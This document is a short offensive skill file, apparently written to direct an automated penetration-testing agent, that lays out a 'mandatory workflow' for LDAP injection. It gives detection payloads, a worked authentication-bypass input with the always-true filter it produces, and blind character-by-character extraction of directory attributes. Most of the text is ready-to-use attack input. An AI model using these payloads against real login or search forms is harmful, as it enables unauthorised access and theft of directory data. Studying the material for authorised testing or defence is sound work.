## ATTACK SKILL: LDAP INJECTION

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Test authentication forms and search fields that might query LDAP/Active Directory:
- `*` -> returns all results if injectable
- `*)(uid=*))(|(uid=*` -> always-true bypass
- `admin*` -> partial match test
- `admin)(|(password=*` -> AND/OR injection

#### STEP 2: AUTH BYPASS
```
username: *)(uid=*))(|(uid=*
password: anything
-> Query becomes: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
-> Always evaluates to TRUE
```

#### STEP 3: BLIND LDAP EXTRACTION
```
username: *)(department=Marketing
-> Different response if department exists
username: *)(department=A*
-> Character-by-character enumeration
```

#### ANTI-PATTERNS: LDAP injection is often confused with SQLi — check if the app uses Active Directory/LDAP for auth.
